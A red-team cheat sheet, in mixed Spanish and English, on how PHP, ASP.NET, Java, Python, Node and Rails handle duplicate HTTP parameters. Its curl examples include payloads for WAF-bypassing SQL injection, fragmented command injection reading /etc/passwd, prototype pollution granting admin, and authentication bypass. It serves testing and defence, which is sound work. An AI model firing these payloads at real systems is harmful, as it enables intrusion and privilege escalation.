---
aliases:
  - HPP Stack Reference
  - PHP HPP
  - ASP.NET HPP
  - Java HPP
  - Node Express HPP
tags:
  - vuln/hpp
  - asset/web-app
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Explotación|Explotación]]"
  - "[[Web]]"
tertiary categories:
  - "[[Web Explotación]]"
kind: SubCheatSheet
linked:
  - "[[HTTP Parameter Pollution]]"
---
# HPP - Per-Stack Behavior

---

## PHP (Last Value Wins)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl "https://target/?a=1&a=2"` | `$_GET['a']` returns `'2'` (último) | Standard PHP. |
| `curl -X POST -d "a=1&a=2" https://target/` | `$_POST['a']` returns `'2'` | POST body same. |
| `curl "https://target/?a[]=1&a[]=2"` | `$_GET['a']` returns `['1','2']` array | Explicit array notation. |
| `curl "https://target/?a=1&a[]=2"` | Mixed types — array overrides scalar | Type confusion. |
| `curl -H "Cookie: a=1; a=2" https://target/` | `$_COOKIE['a']` last set wins | Cookie behavior. |
| `curl "https://target/?a=safe&a=evil"` (last wins) | Backend procesa `evil` | Authentication bypass vector. |
^hpp-stack-php

---

## ASP.NET (Concatenation con Coma)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl "https://target/?a=1&a=2"` | `Request.QueryString["a"]` returns `"1,2"` | ASP.NET default concat. |
| `curl "https://target/?id=SELECT&id=*&id=FROM&id=users"` | Backend recibe `"SELECT,*,FROM,users"` → SQLi fragmented | WAF bypass canonical. |
| `curl -X POST -d "a=1&a=2" https://target/` | `Request.Form["a"]` returns `"1,2"` | POST body concat. |
| Backend code: `Request.QueryString.GetValues("a")` returns `["1","2"]` | Explicit array si dev usa GetValues | Per-callsite differential. |
| `curl "https://target/api?id=safe&id='%20OR%201=1--"` | Concat `"safe,' OR 1=1--"` → SQLi via fragments | Stack-specific bypass. |
| `curl "https://target/cmd?c=ls&c=;&c=cat&c=/etc/passwd"` | Command injection fragmented | Same idea. |
^hpp-stack-aspnet

---

## Java (First Wins / Array)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl "https://target/?a=1&a=2"` | `request.getParameter("a")` returns `"1"` (primer) | Standard Java/Tomcat/Jetty. |
| Backend usa `request.getParameterValues("a")` con same URL | Returns `String[]` `["1","2"]` | Explicit array. |
| `curl "https://target/admin?user=admin&user=attacker"` | Java toma primer `admin` para auth, backend logic puede usar último | Differential. |
| `curl "https://target/?a=safe&a=evil"` (Java first-wins) | Backend procesa `safe` | Inverso de PHP. |
| Spring `@RequestParam("a") String a` returns first | Default Spring | Pre-Spring config. |
| Spring `@RequestParam("a") List<String> a` returns all | Explicit array binding | Modern Spring. |
| `curl -X POST -d "a=1&a=2" https://target/` | `request.getParameter` first wins en POST también | Same behavior. |
^hpp-stack-java

---

## Python / Flask / Django

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl "https://target/?a=1&a=2"` (Flask) | `request.args.get('a')` returns `'1'` (Werkzeug default — first wins) | Flask. |
| `curl "https://target/?a=1&a=2"` (Django) | `request.GET.get('a')` returns `'2'` (last wins) | Django. |
| Backend usa `request.args.getlist('a')` (Flask) o `request.GET.getlist('a')` (Django) | Returns `['1','2']` array | Explicit. |
| `curl "https://target/api?a=1&a=2"` (FastAPI con Pydantic typed) | Per-binder behavior | Modern Python. |
| `curl "https://target/?a=1&a=2"` (Tornado `self.get_argument("a")`) | Returns `'2'` (last) | Tornado. |
| Combine con `request.values` Flask (query + form combined) | First-wins multi-source | Multi-source confusion. |
^hpp-stack-python

---

## Node.js / Express

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl "https://target/?a=1&a=2"` (Express con `qs` default) | `req.query.a = ['1','2']` (array) | Express `extended:true`. |
| `curl "https://target/?a=1&a=2"` (Express con `querystring` legacy) | Same array behavior | `extended:false`. |
| Backend `req.query.a[0]` y `req.query.a[1]` | Manual array access | Standard Express. |
| `curl "https://target/?a=safe&a=evil"` (Express receives array) | Backend logic may use first/last/specific index | Per-app logic. |
| `curl "https://target/?__proto__[isAdmin]=true&__proto__[role]=admin"` (qs library merge → PP combo) | Prototype Pollution via HPP-style | qs library Object merge. |
| Koa `ctx.query.a` with `?a=1&a=2` returns array | Per-Koa version | Koa-specific. |
| `curl -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "a=1&a=2" https://target/` | Body parsing same as query (con body-parser) | POST same behavior. |
^hpp-stack-node

---

## Ruby on Rails (Last Wins)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl "https://target/?a=1&a=2"` (Rails) | `params[:a]` returns `"2"` (last) | Standard Rails. |
| `curl "https://target/?a[]=1&a[]=2"` | `params[:a]` returns `["1","2"]` array | Explicit array notation. |
| `curl "https://target/?a[b]=1&a[b]=2"` | Nested hash — `params[:a][:b]` last wins | Hash params. |
| `curl "https://target/?a=safe&a=evil"` (Rails last-wins) | Backend procesa `evil` | Same as PHP. |
| Sinatra con same URL | Rails behavior heredada de Rack | Rack-based same. |
| Combine con `params.require(:a).permit(...)` | Whitelist applied después de parse | Strong params defense. |
^hpp-stack-ruby

### Cross-stack reference table

```
| Stack         | First   | Last         | Concat    | Array notation |
|---------------|---------|--------------|-----------|----------------|
| PHP           | -       | YES (default)| -         | a[]=1&a[]=2 → array |
| ASP.NET       | -       | -            | YES "1,2" | GetValues() → array |
| Java          | YES     | -            | -         | getParameterValues() |
| Flask         | YES     | -            | -         | getlist() → array |
| Django        | -       | YES          | -         | getlist() → array |
| Express (qs)  | -       | -            | -         | qs default → array |
| Rails         | -       | YES          | -         | a[]=1&a[]=2 → array |
| Go            | YES     | -            | -         | Query()["a"] → array |
```

---
